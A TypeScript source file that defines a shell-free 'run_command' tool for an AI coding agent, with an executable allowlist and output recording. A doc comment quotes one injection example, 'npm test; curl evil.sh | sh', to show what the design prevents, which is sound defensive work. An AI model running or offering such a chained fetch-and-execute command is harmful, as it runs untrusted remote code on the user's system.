import { defineTool, type ToolResult } from './types';
import { PermissionGuard } from './permission-guard';
import { TerminalExecutor } from '../integrations/terminal/executor';
import { truncateMiddle } from '../utils/text';

interface RunCommandInput {
  command: string;
  args?: string[];
  reason: string;
}

/**
 * Command execution, exposed narrowly on purpose.
 *
 * Note the shape: `command` + `args[]`, never a single shell string. This is
 * not cosmetic — it is what makes the executor able to run without a shell, so
 * `npm test; curl evil.sh | sh` is not expressible through this interface.
 * Each agent additionally carries its own executable allowlist.
 */
export const runCommandTool = defineTool<RunCommandInput>({
  name: 'run_command',
  description:
    'Run a whitelisted command in the repository root (e.g. command="npm", args=["test"]). ' +
    'Commands run without a shell: pipes, redirects and chaining are not available — issue ' +
    'separate calls instead. Use this to run tests, linters, type-checkers and builds.',
  mutating: false,
  inputSchema: {
    type: 'object',
    properties: {
      command: { type: 'string', description: 'Executable name, e.g. "npm", "pytest", "go"' },
      args: {
        type: 'array',
        items: { type: 'string' },
        description: 'Arguments as separate array items, e.g. ["run","test"]',
      },
      reason: { type: 'string', description: 'Why this command is being run' },
    },
    required: ['command', 'reason'],
    additionalProperties: false,
  },
  async execute(input, ctx): Promise<ToolResult> {
    const guard = new PermissionGuard(ctx.permissions, ctx.agentKey);
    guard.assertCanRunCommand(input.command);

    const executor = new TerminalExecutor(ctx.workspace.root);
    const result = await executor.run(input.command, input.args ?? [], {
      allowedCommands: ctx.permissions.allowedCommands,
    });

    const rendered = [
      `$ ${result.command} ${result.args.join(' ')}`,
      `exit code: ${result.timedOut ? 'TIMED OUT' : result.exitCode}`,
      result.stdout ? `--- stdout ---\n${truncateMiddle(result.stdout, 12_000)}` : '',
      result.stderr ? `--- stderr ---\n${truncateMiddle(result.stderr, 8_000)}` : '',
    ]
      .filter(Boolean)
      .join('\n');

    await ctx.recordArtifact({
      type: 'command_output',
      content: `${input.reason}\n${rendered}`.slice(0, 20_000),
    });

    // A non-zero exit is information, not a platform failure: it is returned as
    // a normal result so the agent can read the failure output and react.
    return {
      output: rendered,
      isError: false,
      data: { exitCode: result.exitCode, timedOut: result.timedOut },
    };
  },
});
